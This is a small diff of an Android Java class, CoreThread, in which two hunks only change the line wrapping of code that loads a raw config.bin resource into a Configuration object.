@@ -300,8 +300,8 @@ public class CoreThread extends Activity implements Runnable {
 		if (!loaded) {
 
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.InputStreamToBuffer(
-					resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(resources
+					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -328,8 +328,8 @@ public class CoreThread extends Activity implements Runnable {
 	public void testRun() {
 		try {
 
-			final byte[] resource = Utils.InputStreamToBuffer(
-					resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(resources
+					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
